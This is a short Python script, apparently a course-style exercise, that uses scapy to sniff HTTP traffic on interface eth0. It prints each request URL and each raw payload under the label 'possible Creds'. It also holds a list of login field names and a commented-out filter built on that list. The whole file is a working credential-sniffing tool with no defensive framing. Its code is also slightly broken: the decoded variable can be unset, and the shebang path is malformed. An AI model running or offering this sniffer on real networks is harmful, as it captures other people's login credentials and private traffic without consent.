#!usr/bin/env python3
#packet sniffer
import scapy.all as sc
from scapy.layers import http
from scapy.layers import *


input_field_options = ['uname','username','email','login','pass','password','urname','ucc',]
def sniff(interface):
    sc.sniff(iface=interface, store=False, prn=process_sniffed_packet)
def get_url(pkt):
    url_path = pkt[http.HTTPRequest].Path
    url_host = pkt[http.HTTPRequest].Host
    bytes_url = url_host+url_path
    return bytes_url.decode('utf-8')
def raw_data(pkt):
    
    if pkt.haslayer(sc.Raw):
        load = pkt[sc.Raw].load
        #print(type(load))
        #print("\nRaw data, possible Creds >>",load,'\n')
        #load_decode = load.decode('utf-8')
        #for option in input_field_options:
            #if option in load_decode:
                #print(load_decode)
                #break
        return load



def process_sniffed_packet(pkt):
    if pkt.haslayer(http.HTTPRequest):
        url = get_url(pkt)
        print("[+] Request URL >>", url)
        
        raw_data_cred = raw_data(pkt)
        if raw_data_cred:
            if isinstance(raw_data_cred,bytes):
                raw_decode = raw_data_cred.decode('utf-8')
            print("\nRaw data, possible Creds >>",raw_decode,'\n')
            
        
sniff('eth0')